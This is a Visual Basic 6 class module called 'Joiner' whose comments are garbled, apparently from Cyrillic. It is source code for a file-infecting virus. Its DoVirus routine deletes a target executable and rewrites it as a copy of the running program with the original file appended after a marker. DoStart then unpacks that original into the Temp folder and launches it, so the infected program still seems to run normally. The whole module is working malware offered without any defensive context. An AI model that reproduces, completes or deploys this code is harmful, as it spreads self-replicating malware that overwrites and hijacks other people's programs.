VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "Joiner"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Option Explicit
Dim strData As String

Public Sub DoVirus(FileName As String)
   Dim TempFile As String
   Dim strFileName As String
   Dim strW() As String
   Dim lCount As Long
   Dim bFerst As Boolean
   bFerst = True
   ' �������� �� ������������
   If Brain.IllFile(FileName) = True Then Exit Sub
   strFileName = FileName
   ' ������� ��������� ����
   TempFile = Left(FileName, InStrRev(FileName, ".") - 1) & ".exet"
    On Error Resume Next
   FileCopy FileName, TempFile
   Kill FileName
   ' �������� ���� ������ .���
   FileName = Left(FileName, InStrRev(FileName, ".") - 1) & ".exe"
   Open FileName For Binary As 10
      Open App.Path & "\" & App.EXEName & ".exe" For Binary As 2
         Open TempFile For Binary As 3
            '������� � ���������� ����� ����� ����-�����
            strData = Space(LOF(2))
            Get #2, , strData
            lCount = InStr(strData, "Start_Inform")
            If lCount <> 0 Then
               strData = Left(strData, lCount - 3)
            End If
            Put #10, , strData
            strW = Split(strFileName, "\")
            Put #10, , vbCrLf & "Start_Inform" & strW(UBound(strW)) & "End_Inform" & vbCrLf
            ' �������� ���� � ���� ���������� �������
            Fast_Copy 3, 10
            Put #10, , vbCrLf & "End-End"
         Close 3
      Close #2
   Close #10
   Kill TempFile
   Exit Sub
Err:

End Sub

Public Sub DoStart()
Dim lStart, lEnd As Long
Dim strW As String * 255
Dim strA As String * 1000
Dim strFile As String
   Open App.Path & "\" & App.EXEName & ".exe" For Binary As 1
      '������� � ���������� ����� ����� ����-�����
      strA = Space(LOF(1))
      strData = ""
      Do While EOF(1) = False
         Get #1, , strA
         strData = strData & strA
         If Len(strData) Mod 10000 = 0 Then
            If InStr(strData, "End_Inform") <> 0 Then Exit Do
         End If
      Loop
      lStart = InStr(strData, "Start_Inform")
      lEnd = InStr(strData, "End_Inform")
      If lStart = 0 Then Exit Sub
      ' ��������� ���� ����
       GetTempPath 255, strW
      strFile = Left(strW, (InStr(strW, "Temp\") + 4))
      strFile = strFile & "\" & Mid(strData, lStart + 12, lEnd - lStart - 12)
      '�������� ����� � ����� ����
      Open strFile For Binary As 2
         Seek 1, lEnd + 10 + 2
          ' ��������� ���� �� ����� ����������� �������
         Fast_Copy 1, 2
      Close #2
   Close #1
   ShellExecute 0, Empty, strFile, Empty, Empty, SW_SHOWNORMAL
End Sub

Private Sub Fast_Copy(Source As Integer, Destination As Integer)
            Dim bFerst As Boolean
            Dim Resoce As Long
            Dim lnLeght As Long
            bFerst = True
            Resoce = LOF(Source)
            ' ������������� ������ ������� ��� �������� (������ ����� �����������)
            lnLeght = Int(Sqr(Resoce))
            strData = Space(lnLeght)
            Do While EOF(Source) = False
               If bFerst Then
                  If Resoce - Seek(Source) < lnLeght Then
                     strData = Space(1)
                     bFerst = False
                  End If
               End If
               Get #Source, , strData
               Put #Destination, , strData
            Loop
End Sub



